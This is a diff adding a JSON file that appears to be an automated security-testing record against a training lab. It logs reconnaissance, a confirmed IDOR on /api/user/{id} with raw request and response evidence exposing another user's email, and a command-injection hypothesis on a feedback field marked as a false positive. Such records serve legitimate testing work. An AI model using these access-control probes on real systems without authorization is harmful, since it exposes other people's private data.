@@ -1,0 +1,36 @@
+{
+  "recon": {
+    "requests_used": 12,
+    "tech": {"server": "nginx", "framework": "node/express", "auth": "cookie session"},
+    "surface": {"endpoints": [{"path": "/api/user/{id}", "method": "GET", "parameter": "id"},
+                               {"path": "/feedback", "method": "POST", "parameter": "email"}]},
+    "js": {"endpoints": ["/api/user/", "/feedback"]}
+  },
+  "hypotheses": [
+    {"id": "H-001", "endpoint": "/api/user/{id}", "method": "GET", "parameter": "id",
+     "class": "IDOR", "confidence": "high",
+     "reason": "Client-controlled numeric id returned by /me"},
+    {"id": "H-002", "endpoint": "/feedback", "method": "POST", "parameter": "email",
+     "class": "CMDI", "confidence": "medium",
+     "reason": "email value reaches a mail command host"}
+  ],
+  "outcomes": {
+    "H-001": {
+      "status": "confirmed", "severity": "high",
+      "payload": "GET /api/user/2 with user wiener's session",
+      "proof": "Response B returned carlos's email to wiener's session",
+      "requests_used": 4,
+      "evidence": {
+        "request-a.http": "GET /api/user/1 HTTP/1.1\nCookie: session=WIENER\n",
+        "response-a.http": "HTTP/1.1 200 OK\n\n{\"id\":1,\"email\":\"wiener@x\"}\n",
+        "request-b.http": "GET /api/user/2 HTTP/1.1\nCookie: session=WIENER\n",
+        "response-b.http": "HTTP/1.1 200 OK\n\n{\"id\":2,\"email\":\"carlos@x\"}\n"
+      }
+    },
+    "H-002": {
+      "status": "false-positive",
+      "false_positive_reason": "input echoed without command separators too",
+      "requests_used": 3
+    }
+  }
+}
